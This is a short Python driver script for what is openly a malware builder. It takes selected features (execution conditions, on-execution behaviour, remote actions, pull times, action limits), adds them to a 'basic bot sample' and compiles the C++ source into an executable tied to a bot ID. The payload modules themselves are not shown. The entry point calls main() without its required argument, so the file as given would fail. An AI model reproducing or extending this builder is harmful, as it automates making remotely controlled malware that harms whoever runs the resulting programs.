import MalwareFeatures
import CodeManager

# main function
# returns a string containing the path to the exe, -1 on failure
def main(features):
    codeManager = CodeManager.CodeManager()
    # add basic things to the bot, standard includes, an id ...
    codeManager.start_basic_bot_sample()
    # malwareFeatures = []
    for feat in features['Execution Conditions']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'Execution Conditions')
    for feat in features['Options']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'Options')
    for feat in features['On Execution']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'On Execution')
    for feat in features['As Remote Action']:
        featObj = codeManager.create_feature_object(feat)
        codeManager.add_malware_feature(featObj, 'As Remote Action')
    if 'Pull Times' in features:
        timeArray = features['Pull Times']
        codeManager.setBotPullTimes(timeArray)
    if 'Action Limit' in features:
        limit = features['Action Limit']
        codeManager.setActionLimit(limit)
    else:
        # if the user left the limit count field blank, having the time windows but no count would break the code
        codeManager.setActionLimit(str(3))
    if 'Action Frequency' in features:
        freq = features['Action Frequency']
        codeManager.setActionFrequency(freq)

    # builtSample = 'newSample.exe'
    sourceCodeFile = 'newSample.cpp'

    res, botID = codeManager.build_executable(sourceCodeFile)
    return res, botID

if __name__ == "__main__":
    main()
